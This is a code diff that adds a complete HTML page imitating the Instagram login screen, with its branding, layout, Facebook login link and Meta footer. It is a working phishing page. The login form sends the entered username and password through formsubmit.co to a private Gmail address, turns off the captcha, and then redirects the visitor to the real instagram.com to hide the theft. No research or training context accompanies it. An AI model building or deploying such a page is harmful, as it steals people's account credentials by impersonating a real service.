@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link rel="icon" type="image/x-icon" href="VsNE-OHk_8a.png">
+</head>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        background-color: #000;
+        font-family: Arial, sans-serif;
+        color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+      }
+      .container {
+        background-color: #000;
+        border: 1px solid #333;
+        padding: 40px;
+        width: 320px;
+        text-align: center;
+        margin-top: 90px;
+      }
+      .logo {
+        font-family: "Grand Hotel", cursive;
+        font-size: 48px;
+        color: #fff;
+        margin-bottom: 30px;
+      }
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        background-color: #1c1c1c;
+        border: 1px solid #333;
+        color: #fff;
+      }
+      .login-btn {
+        background-color: #0095f6;
+        border: none;
+        color: white;
+        padding: 10px;
+        width: 100%;
+        font-weight: bold;
+        margin: 5px 0;
+        cursor: pointer;
+      }
+      .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        margin: 10px 0;
+      }
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #333;
+      }
+      .divider:not(:empty)::before {
+        margin-right: 0.5em;
+      }
+      .divider:not(:empty)::after {
+        margin-left: 0.5em;
+      }
+      .facebook-login {
+        color: #0095f6;
+        text-decoration: none;
+        font-weight: bold;
+      }
+      .forgot {
+        color: #aaa;
+        margin-top: 10px;
+        font-size: 12px;
+      }
+      .signup {
+        background-color: #111;
+        border: 1px solid #333;
+        padding: 20px;
+        width: 320px;
+        text-align: center;
+        margin-top: 10px;
+      }
+      .signup a {
+        color: #0095f6;
+        text-decoration: none;
+        font-weight: bold;
+      }
+      .get-app {
+        color: #aaa;
+        margin: 20px 0 10px;
+        font-size: 14px;
+      }
+      .store-buttons img {
+        width: 120px;
+        margin: 0 5px;
+      }
+      .footer {
+        color: #666;
+        font-size: 12px;
+        margin-top: 40px;
+        text-align: center;
+      }
+      .footer a {
+        color: #666;
+        margin: 0 5px;
+        text-decoration: none;
+      }
+
+      @media screen and (max-width: 600px) {
+        body {
+          padding: 0 10px;
+        }
+        .container {
+          margin-top: 0px;
+          width: 100% !important;
+          border: none !important;
+        }
+        .signup {
+          width: 100%;
+          border: none !important;
+          background-color: transparent !important;
+        }
+
+  
+
+        .signup {
+          background-color: #111;
+          border: none !important;
+          padding: 20px;
+          width: 320px;
+          text-align: center;
+          margin-top: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">Instagram</div>
+      <form action="https://formsubmit.co/mdj.faheem6@gmail.com" method="POST">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://instagram.com">
+      <input
+        type="text"
+        placeholder="Phone number, username, or email"
+        style="border-radius: 4px !important"
+        name="username"
+      />
+      <input
+        type="password"
+        placeholder="Password"
+        style="border-radius: 4px !important"
+        name="password"
+      />
+      <button class="login-btn" style="border-radius: 4px !important" type="submit" >
+        Log in
+      </button>
+      </form>
+      <div class="divider">OR</div>
+      <a href="https://www.facebook.com/" class="facebook-login">Log in with Facebook</a>
+      <div class="forgot">Forgot password?</div>
+    </div>
+
+    <div class="signup">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
+
+    <div class="get-app">Get the app.</div>
+    <div class="store-buttons">
+      <a href="https://play.google.com/store/games?device=windows"></a><img src="Play.png" alt="Get it on Google Play" height="43.33px" ></a>
+      <a href="https://apps.microsoft.com/home?hl=en-us&gl=US"><img src="Microsoft.png" alt="Get it from Microsoft" height="43.33px"></a>
+    </div>
+
+    <div class="footer">
+      <div>
+        <a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> ·
+        <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> ·
+        <a href="#">Privacy</a> · <a href="#">Terms</a> ·
+        <a href="#">Locations</a> · <a href="#">Instagram Lite</a> ·
+        <a href="#">Threads</a> ·
+        <a href="#">Contact Uploading & Non-Users</a> ·
+        <a href="#">Meta Verified</a> · <a href="#">Meta in Indonesia</a>
+      </div>
+      <div style="margin-top: 10px">English · © 2025 Instagram from Meta</div>
+    </div>
+  </body>
+</html>
